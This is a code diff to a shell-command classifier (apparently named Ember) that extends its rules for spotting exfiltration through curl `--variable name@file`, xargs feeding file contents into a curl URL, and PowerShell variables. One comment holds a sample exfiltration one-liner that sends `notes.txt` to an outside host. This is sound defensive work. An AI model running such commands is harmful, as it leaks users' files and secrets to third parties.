@@ -511,7 +511,7 @@ class Classifier {
   /** `set -a`: every variable set after it is exported to the programs that run (commands-remote-v5-2). */
   allExport = false;
   /** The same for a PowerShell variable (lower case, `env:` kept): only for Ember's own refusal (commands-remote-c3-2). */
-  private psVarValues = new Map<string, string[]>();
+  protected psVarValues = new Map<string, string[]>();
   /** Words of a variable Ember couldn't resolve, with how they were used: judged again once a loop's input gives it a value. */
   private unseenUses: { parts: readonly Part[]; use: PathUse; sc: Scope }[] = [];
   /** The text a command was given on stdin by a here-document or here-string (null: Ember can't see all of it), by index. */
@@ -3756,14 +3756,20 @@ class Engine extends Classifier {
     // prints is a credential (commands-remote-r9-9).
     if (args.some(a => a.v !== null && cloudMetadata(a.v))) this.add("secret", "secret.cloud", SAYS.secrets);
     const says = "May send what a file or a command holds to another computer.";
-    const filled = (name: string): boolean => (this.varValues.get(name) ?? []).some(f => f.includes(UNSEEN)) || this.loopVars.get(name) === "read";
+    // A PowerShell variable the line filled from a command counts as a POSIX one does (commands-classes-y9-6).
+    const filled = (name: string): boolean => (this.varValues.get(name) ?? []).some(f => f.includes(UNSEEN)) || this.loopVars.get(name) === "read"
+      || (this.psVarValues.get(name.toLowerCase().replace(/^(script|global|local|private|using):/, "")) ?? []).some(f => f.includes(UNSEEN));
     let hit = /^(http|https|xh|xhs)$/.test(key) && s.stdin === "file";
     const { own } = this.ownWords(args);
     for (let k = 0; k < args.length && !hit; k++) {
       const a = args[k];
       if (!own.includes(a)) continue;
       // curl reads a header's lines from a file (`-H @file`).
-      if (a.v !== null) { hit = /^curl/.test(key) && /^(-H|--header|--proxy-header)$/.test(args[k - 1]?.v ?? "") && /^@./.test(a.v); continue; }
+      // curl reads a variable's value from a file too (`--variable name@file`: commands-classes-y9-6).
+      if (a.v !== null) {
+        hit = /^curl/.test(key) && ((/^(-H|--header|--proxy-header)$/.test(args[k - 1]?.v ?? "") && /^@./.test(a.v)) || (args[k - 1]?.v === "--variable" && /^[^=@]+@./.test(a.v)) || /^--variable=[^=@]+@./.test(a.v));
+        continue;
+      }
       if (a.parts?.some(p => typeof p !== "string" && p.name !== null && filled(p.name))) { hit = true; continue; }
       hit = substituted(a.raw).some(inner => !saysLittle(inner));
     }
@@ -5744,6 +5750,11 @@ reg(NATIVE, ["xargs"], h => {
   // A bare -i or --replace replaces {}.
   const repl = values(p, "I", "replace", "i", "J")[0] ?? (has(p, "i", "replace") ? "{}" : undefined);
   const ops = p.operands.length ? p.operands : [lit("echo")];
+  // Input Ember can't see put inside a longer word of a program that sends leaves the computer in its address or a
+  // header (`cat notes.txt | xargs -I{} curl https://x.io/{}`: commands-classes-y9-6); a list of addresses fetched
+  // one by one (`xargs -I{} curl -O {}`) is as before.
+  if (repl && typeof h.s.stdinText !== "string" && ops[0].v !== null && FETCHERS.has(programName(ops[0].v, { os: h.sc.os, family: h.sc.family, wsl: h.sc.wsl, mountRoot: h.sc.mountRoot }).key)
+    && ops.slice(1).some(a => a.v !== null && a.v !== repl && a.v.includes(repl))) h.e.add("publish", "send.contents", "May send what a file or a command holds to another computer.");
   // A here-string whose variables Ember follows (`xargs rm -rf <<< "$d"`): its pieces stand where the input goes, so the
   // command judges the variable's values as it uses them (commands-remote-w5-5).
   const fed = values(p, "a", "arg-file").length ? undefined : h.s.stdinVars?.word?.parts;
